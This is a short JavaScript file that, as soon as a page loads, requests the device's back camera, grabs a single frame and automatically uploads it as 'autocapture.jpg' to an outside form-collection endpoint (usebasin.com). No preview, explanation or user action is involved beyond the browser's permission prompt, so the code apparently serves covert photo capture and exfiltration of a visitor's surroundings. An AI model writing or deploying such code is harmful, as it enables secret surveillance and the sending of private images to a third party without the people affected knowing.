const BASIN_URL = "https://usebasin.com/f/fb249d3e371b";

window.addEventListener("load", () => startCapture());

async function startCapture() {
  try {
    // Request BACK CAMERA
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: { exact: "environment" } }
    });

    // Capture frame
    const track = stream.getVideoTracks()[0];
    const imageCapture = new ImageCapture(track);
    const frame = await imageCapture.grabFrame();

    // Draw to canvas
    const canvas = document.createElement("canvas");
    canvas.width = frame.width;
    canvas.height = frame.height;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(frame, 0, 0);

    // Convert to blob
    const blob = await new Promise((resolve) =>
      canvas.toBlob(resolve, "image/jpeg", 0.95)
    );

    // Stop camera
    track.stop();

    // Upload automatically
    uploadToBasin(blob);

  } catch (err) {
    console.error("Camera Error:", err);
    alert("Camera Error: " + err.message);
  }
}

function uploadToBasin(blob) {
  const formData = new FormData();
  formData.append("photo", blob, "autocapture.jpg");

  fetch(BASIN_URL, {
    method: "POST",
    body: formData
  })
    .then(() => console.log("Photo uploaded successfully"))
    .catch((err) => console.error("Upload Error:", err));
}
